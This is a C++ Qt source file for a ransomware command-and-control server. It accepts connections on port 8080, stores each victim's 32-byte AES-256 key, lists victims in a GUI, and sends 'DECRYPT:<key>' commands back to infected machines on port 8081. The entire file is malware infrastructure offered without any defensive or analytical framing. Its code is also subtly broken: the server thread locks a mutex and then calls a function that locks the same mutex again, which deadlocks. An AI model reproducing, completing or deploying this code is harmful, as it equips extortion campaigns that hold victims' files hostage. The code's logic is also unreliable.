#ifndef C2_SERVER_CPP
#define C2_SERVER_CPP

#include "c2_server.h"
#include "ui_c2_server.h"
#include <boost/asio.hpp>
#include <QMessageBox>
#include <iostream>
#include <mutex>

using namespace boost::asio;
using ip::tcp;

void ServerThread::run() {
    try {
        tcp::acceptor acceptor(m_parent->getIoContext(), tcp::endpoint(tcp::v4(), 8080));
        while (!isInterruptionRequested()) {
            tcp::socket socket(m_parent->getIoContext());
            acceptor.accept(socket);
            std::string client_id = socket.remote_endpoint().address().to_string();
            emit clientConnected(QString::fromStdString(client_id));

            char buffer[32]; // AES-256 key (32 bytes)
            boost::system::error_code error;
            size_t len = socket.read_some(boost::asio::buffer(buffer, 32), error);
            if (!error && len == 32) {
                std::lock_guard<std::mutex> lock(m_parent->m_mutex);
                m_parent->setClientKey(client_id, std::string(buffer, len));
                emit keyReceived(QString::fromStdString(client_id));
                std::cout << "Received key from " << client_id << std::endl;
            } else if (error) {
                std::cout << "Read error for " << client_id << ": " << error.message() << std::endl;
            }
            boost::system::error_code ec;
            socket.shutdown(tcp::socket::shutdown_both, ec);
            socket.close(ec);
        }
    } catch (std::exception& e) {
        emit serverError(QString::fromStdString(e.what()));
    }
}

C2Server::C2Server(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::C2Server),
    m_serverThread(nullptr),
    io_ctx()
{
    ui->setupUi(this);
    connect(ui->startButton, &QPushButton::clicked, this, &C2Server::startServer);
    connect(ui->decryptButton, &QPushButton::clicked, this, &C2Server::sendDecryptCommand);
    connect(this, &C2Server::clientConnected, this, [this](const QString& clientId) {
        ui->clientList->addItem(QString("Connected: %1").arg(clientId));
    });
    connect(this, &C2Server::keyReceived, this, [this](const QString& clientId) {
        ui->clientList->addItem(QString("Key received from: %1").arg(clientId));
    });
    connect(this, &C2Server::serverError, this, [this](const QString& error) {
        QMessageBox::critical(this, "Error", error);
    });
}

C2Server::~C2Server() {
    if (m_serverThread) {
        m_serverThread->requestInterruption();
        m_serverThread->quit();
        m_serverThread->wait(2000); // Wait up to 2 seconds
        delete m_serverThread;
    }
    delete ui;
}

void C2Server::startServer() {
    if (!m_serverThread) {
        m_serverThread = new ServerThread(this);
        connect(m_serverThread, &ServerThread::clientConnected, this, &C2Server::clientConnected);
        connect(m_serverThread, &ServerThread::keyReceived, this, &C2Server::keyReceived);
        connect(m_serverThread, &ServerThread::serverError, this, &C2Server::serverError);
        m_serverThread->start();
        ui->startButton->setEnabled(false);
        ui->clientList->addItem("Server started...");
    }
}

void C2Server::sendDecryptCommand() {
    if (!m_serverThread || clientKeys.empty()) {
        QMessageBox::warning(this, "Error", "No clients connected or keys received.");
        return;
    }
    try {
        std::lock_guard<std::mutex> lock(m_mutex);
        for (const auto& client : clientKeys) {
            tcp::socket socket(io_ctx);
            socket.connect(tcp::endpoint(boost::asio::ip::address::from_string(client.first), 8081));
            std::string command = "DECRYPT:" + client.second;
            boost::system::error_code ec;
            boost::asio::write(socket, boost::asio::buffer(command), ec);
            if (ec) {
                throw std::runtime_error(ec.message());
            }
            socket.shutdown(tcp::socket::shutdown_both, ec);
            socket.close(ec);
            emit clientConnected(QString("Sent decrypt command to: %1").arg(QString::fromStdString(client.first)));
        }
    } catch (std::exception& e) {
        QMessageBox::warning(this, "Error", QString("Decrypt command error: %1").arg(e.what()));
    }
}

void C2Server::setClientKey(const std::string& clientId, const std::string& key) {
    std::lock_guard<std::mutex> lock(m_mutex);
    clientKeys[clientId] = key;
}

io_context& C2Server::getIoContext() {
    return io_ctx;
}

#endif // C2_SERVER_CPP